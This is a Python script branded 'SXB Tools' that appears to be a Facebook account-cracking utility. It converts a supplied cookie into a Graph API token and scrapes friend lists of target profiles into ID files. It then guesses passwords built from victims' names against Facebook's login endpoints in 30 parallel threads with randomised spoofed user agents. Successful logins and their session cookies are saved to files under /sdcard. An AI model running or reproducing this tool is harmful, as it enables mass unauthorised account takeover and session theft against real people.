from os import path
import os,platform,base64,zlib,pip,urllib
os.system('clear')
print('\n\033[1;37m Loading SXB Tools...')
try:
	import os,requests,json,time,re,random,sys,uuid,string,subprocess
	from string import *
	import bs4
	#import dz
	from concurrent.futures import ThreadPoolExecutor as tred
	from bs4 import BeautifulSoup as sop
	from bs4 import BeautifulSoup
except ModuleNotFoundError: 
	print('\n Installing missing modules ...')
	os.system('pip install requests bs4 futures==2 > /dev/null')
	os.system('python SXB.py')



fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
ugen=[]
for xd in range(10000):
        aa='Mozilla/5.0 (Linux; U; Android'
        b=random.choice(['6','7','8','9','10','11','12','13'])
        c=f' TL-tl; {str(gt)}'
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36'
        uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku2)
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
        
        


def linex():
        print('----------------------------------------------')
def clear():
        os.system('clear')
        print(logo)


def login():
    os.system('clear')
    print(logo)
    try:
        cokies = str(input('\033[0;97m[+] Cookie : '))
        if len(cokies)<10:
            print ('\033[0;97minvalid Cookie')
            time.sleep(1)
            publc.clear()
            main_menu()
        cookie = {'cookie':cokies}
        ses = requests.Session()
        data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038', 'scope': ''}
        req  = ses.post('https://graph.facebook.com/v16.0/device/login/',data=data).json()
        cd   = req['code']
        ucd  = req['user_code']
        url  = 'https://graph.facebook.com/v16.0/device/login_status?method=post&code=%s&access_token=1348564698517390|007c0a9101b9e1c8ffab727666805038'%(cd)
        req  = BeautifulSoup(ses.get('https://mbasic.facebook.com/device',cookies=cookie).content,'html.parser')
        raq  = req.find('form',{'method':'post'})
        dat  = {'jazoest' : re.search('name="jazoest" type="hidden" value="(.*?)"',str(raq)).group(1), 'fb_dtsg' : re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(req)).group(1), 'qr' : '0', 'user_code' : ucd}
        rel  = 'https://mbasic.facebook.com' + raq['action']
        pos  = BeautifulSoup(ses.post(rel,data=dat,cookies=cookie).content,'html.parser')
        dat  = {}
        raq  = pos.find('form',{'method':'post'})
        for x in raq('input',{'value':True}):
            try:
                if x['name'] == '__CANCEL__' : pass
                else: dat.update({x['name']:x['value']})
            except Exception as e: pass
        rel = 'https://mbasic.facebook.com' + raq['action']
        pos = BeautifulSoup(ses.post(rel,data=dat,cookies=cookie).content,'html.parser')
        req = ses.get(url,cookies=cookie).json()
        tok = req['access_token']
        open('.access_token.txt', 'w').write(tok)
        open('.cokie.txt', 'w').write(cokies)
        if 'public' in publc:
            publc.clear()
            crack().plerr()
        else:
            ext_menu()
    except Exception as e:
        print ('\033[0;97mCookie invalid')
        time.sleep(3)
        login()



        
def ext_menu():
    os.system("clear")
    try:
        token  = open('.access_token.txt','r').read().replace('\n', '')
        cookie = open('.cokie.txt','r').read().replace('\n', '')
    except:
        print('\n\033[0;97mCookies Invalid ')
        os.system('rm -rf .access_token.txt .cokie.txt')
        time.sleep(1)
        login()
    try:
        me = requests.get(f'https://graph.facebook.com/me?access_token={token}', cookies={'cookie':cookie}).json()
        name = me['name']
        iid = me['id']
    except KeyError:
        if 'Error loading application' in str(me):
            print ('\r\033[0;97mCokie Not Expired But Need Login Again')
            time.sleep(1)
            os.system('rm -rf .access_token.txt .cokie.txt')
            login()
        elif 'Please reduce the amount' in str(me):
            print ('\r\033[0;97minternet Error')
            time.sleep(1)
            ext_menu()
        else:
            print ('\033[0;97mCokie invalid')
            time.sleep(1)
            os.system('rm -rf .access_token.txt .cokie.txt')
            login()
    os.system('clear')
    print(logo)
    print ('\033[1;33m  ~~~~~~Extract ids Menu~~~~~~\033[0;97m')
    print (47*'-')
    print ('\033[1;32m[1]Extract ids Only New')
    print ('\033[1;32m[2]Extract All Old New Mix')
    print ('\033[1;32m[3]Extract ids Only New Auto')
    print ('\033[1;32m[4]Remove Double Links From File\033[0;97m')
    print ('\033[1;32m[5]Separate Links From File')
    print ('\033[1;32m[6]Cut Links From Used File')
    print ('\033[1;32m[7]Delete Cookies')
    print ('\033[1;32m[0]Back\033[0;97m')
    print (47*'-')
    ext_menu_sel()

def ext_menu_sel():
    hh = input('\033[1;36mSelect Option: \033[0;97m')
    if hh == "1" or hh == "01":
        lolex()
    elif hh == "2" or hh == "02":
        oldex()
    elif hh == "3" or hh == "03":
        autofile()
    elif hh == "4" or hh == "04":
        double()
    elif hh == "5" or hh == "05":
        separate()
    elif hh == "6" or hh == "06":
        cutrs()
    elif hh == "7" or hh == "07":
        os.system('rm -rf .access_token.txt')
        os.system('rm -rf .cokie.txt')
        login()
    elif hh == "0":
        main_menu()
    elif hh == "":
        print ('Select Valid Option')
        ext_menu_sel()
    else:
        print ('Select Valid Option')
        ext_menu_sel()

def lolex():
    os.system("clear")
    try:
        __cookie__ = open(".access_token.txt", "r").read().replace('\n', '')
        cookie = open('.cokie.txt', 'r').read().replace('\n', '')
    except:
        print ('Cookies Invalid')
        time.sleep(1)
        os.system('rm -rf .access_token.txt .cokie.txt')
        login()

    os.system('clear')
    print(logo)
    print ('\033[1;33mFor Example /sdcard/jutt.txt etc...\033[0;97m')
    print (47*'-')
    fp = input('\033[1;32mOutput Save File Name: \033[0;97m')
    if '/sdcard/' not in fp:
        print ('\033[1;33mGive Correct Directory /sdcard/filename.txt\033[0;97m')
        time.sleep(2)
        lolex()
    print ('\033[1;33mExample 1, 2, 3, 4, 5, 6, 7 etc...\033[0;97m')
    zo = int(input('\033[1;32mHow Many Choice Links You Want To Select?: \033[0;97m'))
    print ('\033[1;33mSelect Link For Example 100089 100090')
    gh = []
    t = 0
    for t in range(zo):
        t+=1
        fb = input('\033[1;32m[%s]choose id link: \033[0;97m'%(t))
        gh.append(fb)
    print ('')
    newex(gh,fp,__cookie__,cookie)

def newex(gh,fp,__cookie__,cookie):
    csy = input('\033[1;32mids: \033[0;97m')
    bcd = csy.rsplit('|')[0]
    if csy == ' ' or csy == '':
        ext_menu()
    try:
        os.system('rm -rf .out*')
        ihh = '5000'
        knt = ('.out.txt')
        list_one=requests.get("https://graph.facebook.com/%s?fields=friends.fields(id,name).limit(5000)&access_token=%s"%(bcd,__cookie__), cookies={'cookie':cookie}).json()
        for ids in list_one['friends']['data']:
            uid = ids['id']
            name = ids['name']
            open(knt,'a').write(uid+'|'+name+'\n')

        print ('\r\033[1;32mSuccessfull id Extract '+bcd)
        for zh in gh:
            os.system('cat .out.txt | grep '+zh+' >> .out1.txt')
            os.system('sort -r .out1.txt | uniq >> '+fp)
        newex(gh,fp,__cookie__,cookie)
    except KeyError:
        if 'Error loading application' in str(list_one):
            print ('\r\033[0;97mCokie not expired but need login again')
            newex(gh,fp,__cookie__,cookie)
        elif 'Please reduce the amount' in str(list_one):
            print ('\r\033[0;97minternet error missing extract link')
            newex(gh,fp,__cookie__,cookie)
        elif 'Unsupported get request' in str(list_one):
            print ('\r\033[0;97mAccount cp or lock of this link')
            newex(gh,fp,__cookie__,cookie)
        elif 'error' in str(list_one):
            print ('\r\033[0;97mCookie expired login new cookie')
            newex(gh,fp,__cookie__,cookie)
        else:
            print('\r\033[0;97mFriendlist private of this link')
            newex(gh,fp,__cookie__,cookie)

def oldex():
    os.system("clear")
    try:
        __cookie__ = open(".access_token.txt", "r").read().replace('\n', '')
        cookie = open('.cokie.txt', 'r').read().replace('\n', '')
    except:
        print ('Cookies invalid')
        time.sleep(1)
        os.system('rm -rf .access_token.txt .cokie.txt')
        login()

    os.system('clear')
    print(logo)
    print ('')
    print ('\033[1;33mFor Example /sdcard/jutt.txt\033[0;97m')
    print ('')
    fp = input('\033[1;32mOutput Save File Name: \033[0;97m')
    if '/sdcard/' in fp:
        allex(fp,__cookie__,cookie)
    else:
        print ('\033[1;31mWrong input Directory')
        print ('\033[1;37mPut /sdcard/filename.txt')
        time.sleep(3)
        oldex()

def allex(fp,__cookie__,cookie):
    csy = input('id: ')
    bcd = csy.rsplit('|')[0]
    ihh = '5000'
    knt = ('.out.txt')
    ys  = open(knt, 'w')
    if csy == ' ' or csy == '':
        ext_menu()
    try:
        os.system('rm -rf .out*')
        list_one=requests.get("https://graph.facebook.com/%s?fields=friends.fields(id,name).limit(5000)&access_token=%s"%(bcd,__cookie__), cookies={'cookie':cookie}).json()
        for ids in list_one['friends']['data']:
            uid = ids['id']
            name = ids['name']
            open(knt,'a').write(uid+'|'+name+'\n')

        print ('\r\033[1;32mSuccessfull id Extract '+bcd)
        vo = "10"
        os.system('cat .out.txt | grep '+ vo +' >> .out1.txt')
        os.system('sort -r .out1.txt | uniq >> '+fp)
        allex(fp,__cookie__,cookie)
    except KeyError:
        if 'Error loading application' in str(list_one):
            print ('\r\033[0;97mCokie not expired but need login again')
            allex(fp,__cookie__,cookie)
        elif 'Please reduce the amount' in str(list_one):
            print ('\r\033[0;97minternet error missing extract link')
            allex(fp,__cookie__,cookie)
        elif 'Unsupported get request' in str(list_one):
            print ('\r\033[0;97mAccount cp or lock of this link')
            allex(fp,__cookie__,cookie)
        elif 'error' in str(list_one):
            print ('\r\033[0;97mCookie expired login new cookie')
            allex(fp,__cookie__,cookie)
        else:
            print('\r\033[0;97mFriendlist private of This Link')
            allex(fp,__cookie__,cookie)

def autofile():
    os.system('clear')
    print(logo)
    try:
        __cookie__ = open(".access_token.txt", "r").read().replace('\n', '')
        cookie = open('.cokie.txt', 'r').read().replace('\n', '')
    except:
        print ('Cookies invalid')
        time.sleep(1)
        os.system('rm -rf .access_token.txt .cokie.txt')
        login()
    os.system('rm -rf .out*')
    try:
        rgb = requests.get('https://raw.githubusercontent.com/SHOOTER-MAKER/Juttbrand/main/ids.txt').text
        open('.ids.txt', 'w').write(rgb)
    except requests.exceptions.ConnectionError:
        print ('\033[0;97mNo internet Connection')
        sys.exit()
    ebd = open('.ids.txt', 'r').read().splitlines()[:2]
    fgf = open('.ids.txt', 'r').read().splitlines()[2:4]
    os.system('rm -rf .ids.txt')
    print ('\033[1;33m  ~~~~~Put Just 1 id Link~~~~~\033[0;97m')
    print (47*'-')
    bcd = input('\033[1;36mPut id: \033[0;97m')
    if bcd == '':
        ext_menu()
    ihh = '5000'
    knt = '.out.txt'
    try:
        list_one=requests.get("https://graph.facebook.com/%s?fields=friends.fields(id,name).limit(5000)&access_token=%s"%(bcd,__cookie__), cookies={'cookie':cookie}).json()
        for ids in list_one['friends']['data']:
            uid = ids['id']
            open(knt,'a').write(uid+'\n')

        print ('\r\033[1;32mSuccessfull id Extract '+bcd)
        for vo in ebd:
            os.system('cat .out.txt | grep '+ vo +' >> .out1.txt')
    except KeyError:
        if 'Error loading application' in str(list_one):
            print ('\r\033[0;97mCokie not expired but need login again')
            time.sleep(1)
            os.system('rm -rf .access_token.txt .cokie.txt')
            login()
        elif 'Please reduce the amount' in str(list_one):
            print ('\033[0;97minternet error missing extract link')
            time.sleep(1)
            autofile()
        elif 'Unsupported get request' in str(list_one):
            print ('\r\033[0;97mAccount cp or lock of this link')
            time.sleep(1)
            autofile()
        elif 'error' in str(list_one):
            print ('\r\033[0;97mCookie expired login new cokie')
            time.sleep(1)
            os.system('rm -rf .access_token.txt .cokie.txt')
            login()
        else:
            print('\r\033[0;97mFriendlist private of this link')
            time.sleep(1)
            autofile()
    frf = [50, 55, 40, 60, 64, 69, 67, 71, 46, 58, 74]
    dtz = random.choice(frf)
    os.system('sort -r .out1.txt | uniq >> .out2.txt')
    bcf = open('.out2.txt', 'r').read().splitlines()[:dtz]
    if len(bcf)<2:
        print ('\n\033[1;33mNew ids not found in this link try another link\033[0;97m')
        input('Press enter to back')
        os.system('rm -rf .out*')
        ext_menu()
    os.system('rm -rf .out*')
    os.system('clear')
    print(logo)
    print ('\033[1;33mExample /sdcard/jutt.txt\033[0;97m')
    print (47*'-')
    save_ = input('\033[1;33mOutput Save File Name: \033[0;97m')
    ihb = '5000'
    idx = []
    for uids in bcf:
        try:
            idd = []
            _cookie_ = open('.access_token.txt', 'r').read().replace('\n', '')
            cookie = open('.cokie.txt', 'r').read().replace('\n', '')
            list_one=requests.get("https://graph.facebook.com/%s?fields=friends.fields(id,name).limit(5000)&access_token=%s"%(uids,_cookie_), cookies={'cookie':cookie}).json()
            for ids in list_one['friends']['data']:
                uid = ids['id']
                name = ids['name']
                idd.append(uid+'|'+name+'\n')
                open('.out.txt','a').write(uid+'|'+name+'\n')

            print ('\r\033[1;32mSuccessfull id Extract '+uids+'\033[0;97m')
            for xo in fgf:
                os.system('cat .out.txt | grep '+ xo +' >> .out1.txt')
                os.system('sort -r .out1.txt | uniq >> '+save_)
            os.system('rm -rf .out*')
        except KeyError:
            if 'Error loading application' in str(list_one):
                print ('\r\033[0;97mCokie not expired but need login again')
                pass
            elif 'Please reduce the amount' in str(list_one):
                print ('\r\033[0;97minternet error missing extract link')
                pass
            elif 'Unsupported get request' in str(list_one):
                print ('\r\033[0;97mAccount cp or lock of this link')
                pass
            elif 'error' in str(list_one):
                print('\r\033[0;97mCookies expired login new cookie')
                pass
            else:
                print ('\r\033[0;97mFriendlist private of this link')
                pass
    os.system('sort -r '+save_+' | uniq >> .out.txt')
    os.system('cat .out.txt > '+save_)
    yuy = open(save_, 'r').read().splitlines()
    fuf = str(len(yuy))
    print (47*'-')
    print ('\033[1;33mSuccessfully Creat File\033[0;97m')
    print (47*'-'+'\n\033[1;32mTotal ids > '+fuf)
    print (47*'-'+'\n\033[1;36mYour File Save Path > '+save_)
    input('\033[1;32mPress Enter To Back\033[0;97m')
    ext_menu()

def double():
    os.system('clear')
    print(logo)
    sf = input("\033[1;32mInput doubling File :\033[0;97m")
    if sf == ' ' or sf == '':
        main_menu()
    print ('\033[1;33mFor Example /sdcard/jutt.txt')
    tf = input("\033[1;32minput file path for save original: \033[0;97m")
    if '/sdcard/' in tf:
        os.system("sort -r "+ sf +" | uniq  >> "+tf)
        print("File sucessfull save as "+tf)
        input('\033[1;32mPress Enter To Back\033[0;97m')
        main_menu()
    else:
        print ('\033[1;31mWrong input Directory')
        print ('\033[1;37mPut /sdcard/filename.txt\033[0;97m')
        time.sleep(3)
        double()

def separate():
    os.system('clear')
    print(logo)
    print ('\033[1;36mSeparate Links From File\033[0;97m')
    print (47*'-')
    file_name = input('\033[1;32mInput file name: ')
    print(47*'-')
    if file_name == '':
        main_menu()
    print ('\033[1;33mFor Example /sdcard/jutt.txt\033[0;97m')
    print (47*'-')
    new_save = input('\033[1;36mSave New file Name: \033[0;97m')
    if "/sdcard/" not in new_save:
        print ('Put /sdcard/yourfile name.txt')
        time.sleep(2)
        separate()
    elif new_save == '':
        main_menu()
    try:
        limit = int(input('\033[1;33mHow many links do you want to separate? \033[0;97m'))
    except:
        limit = 1
    y = 0
    for y in range(limit):
        y+=1
        links = input('\033[0;97mSelect link %s: '%(y))
        os.system('cat '+file_name+' | grep '+links+' >> '+new_save)
    print(47*'-')
    print('\033[1;32mLinks Separate successfully')
    print('\033[1;33mNew file saved as: /sdcard/'+new_save)
    print(47*'-')
    input('\033[1;36mPress enter to back ')
    main_menu()

def cutrs():
    os.system('clear')
    print(logo)
    print ('\033[1;33m~~~~~~Cut Links From Used File~~~~~~~\033[0;97m')
    print (47*'-')
    bc = input('\033[1;32mPut File: \033[0;97m')
    try:
        ba = open(bc, 'r').read().splitlines()
    except (FileNotFoundError, IOError):
        print ('\033[0;97mFile Not Found')
        time.sleep(3)
        cutrs()
    print ('\033[1;33mExample /sdcard/filename.txt\033[0;97m')
    sab = input('\033[1;36mSave File Name: \033[0;97m')
    print ('\033[1;33mExample 2000, 5000, 10000, 20000, etc..')
    try:
        fdv = int(input('\033[1;32mSelect Cuting Limit From File: \033[0;97m'))
        dy = ba[fdv:5000000]
        bos = '\n'.join(dy)
        open(sab, 'w').write(bos + '\n')
        print ('\033[1;33mFile successfully Save > '+sab)
        print (47*'-')
        input('\033[1;32mPress Enter To Back\033[0;97m')
        main_menu()
    except (ValueError, EOFError, KeyboardInterrupt):
        print ('\033[1;33m\nSelect Valid limit\033[0;97m')
        print ('\033[1;33mExample 2000, 5000, 10000, 20000, etc..')
        input('\033[1;32mPress Enter Go To Back\033[0;97m')
        cutrs()



                                  
logo= f'''          
     .M"""bgd `YMM'   `MP' `7MM"""Yp, 
    ,MI    "Y   VMb.  ,P     MM    Yb 
    `MMb.        `MM.M'      MM    dP 
      `YMMNq.      MMb       MM"""bg. 
    .     `MM    ,M'`Mb.     MM    `Y 
    Mb     dM   ,P   `MM.    MM    ,9 
    P"Ybmmd"  .MM:.  .:MMa..JMMmmmd9  
----------------------------------------------
[*] Author  : Talha Rajput
[*] Github  : Programmer-SXB
[*] Version : 1.0.1
----------------------------------------------'''
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]




def option():
    os.system('clear')
    print(logo)
    print(f' [1] File Cloning')
    print(f' [2] Create File')
    print(f' [3] 2F Live Enble')
    print(f' [4] Remove Cookie')
    print(f' [0] Exit Menu')
    linex()
    select = input(' [•] Choose an option : ')
    if select =='1':
    	crack_file()
    elif select =='2':
    	ext_menu()
    elif select =='3':
    	os.system('python 2f.py')
    elif select =='4':
        time.sleep(2)
        os.system('clear')
        print(logo)
        print(' Removing Token .')
        time.sleep(1)
        os.system('clear')
        print(logo)
        print(' Removing Token ..')
        time.sleep(1)
        os.system('clear')
        print(logo)
        print(' Removing Token ...')
        time.sleep(2)
        os.system('clear')
        print(logo)
        print('\033[1;91mToken Removed\033[0m')
        time.sleep(3)
        os.system('rm -rf access_token.txt')
        option()
    elif select =='0':
    	exit('Exit')
    else:
        print('\n Select valid option ... ')
        time.sleep(2)
        option()







def crack_file():
        try:
                clear()
                x = ("sex")
                if x == ("sex"):
                                print('[•] \33[1;37mExample : /sdcard/filename.txt')
                                linex()
                                file = input('[•] Put location : ')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print(' File location not found ')
                                        time.sleep(1)
                                        option()
                                clear()                            
                                print('[1] Method (for New ids)\n[2] Method (try old ids)')
                                linex()
                                mthd=input('[+] Choose an option : ')
                                
                                os.system('clear')
                                print(logo)
                                plist = []
                                
                                try:
                                        ps_limit = int(input('[*] Please Put Your Password Limit : '))
                                        os.system('clear')
                                        print(logo)
                                except:
                                        ps_limit =1
                                                          
                                print('[*] Example : first last,firstlast,first123,etc')
                                linex()
                                for i in range(ps_limit):
                                	    
                                        plist.append(input(f'[*] Password {i+1} : '))
                                os.system('clear')
                                print(logo)                                
                                cx=('y')
                                if cx in ['y','y','1','n','n']:
                                        pcp.append('y')
                                else:
                                        pcp.append('n')
                                with tred(max_workers=30) as crack_submit:
                                        clear()
                                        total_ids = str(len(fo))
                                        print('[+] Total account : \033[1;32m'+total_ids+f'\033[1;37m')                                        
                                        print('[-] Process has been started')
                                        print('[-] To Stop Process CTRL+c')
                                        linex()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(ffb,ids,names,passlist)
                                                elif mthd in ['2','02']:
                                                        crack_submit.submit(mbasic,ids,names,passlist)
                                                else:
                                                        crack_submit.submit(mbasi,ids,names,passlist)
                                print('\033[1;37m')
                                linex()
                                print(' The process has completed')
                                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                                linex()
                                input(' Press enter to back ')
                                os.system('python SXB.py')                          
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
                print('\n No internet connection ...')
                exit()
                
                
                
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m[%s] |\033[1;37m\033[1;37m OK:%s\033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
                        last = 'Khan'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                        ua=random.choice(ugen)
                        head = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        SXB=session.cookies.get_dict().keys()
                        if "c_user" in SXB:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m[OK] %s | %s'%(ids,pas))
                                open('/sdcard/OK-NEW.txt', 'a').write(ids+'|'+pas+'\n')
                                open("/sdcard/OK_Cookie.txt", "a").write(ids + '|' + pas + ' | ' + kuki + "\n")                            
                                oks.append(ids)
                                
                                break
                        elif 'checkpoint' in SXB:
                                if 'y' in pcp:
                                        print('\r\r\x1b[1;31m[CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/CP/CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1
        
        
        
def getKey():
    myid = str(os.getuid())
    myid=myid.upper()[::-1]
    n=re.findall("(\d\d)",myid)
    plat=platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
    xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
    
    return "SXB"+myid+xp
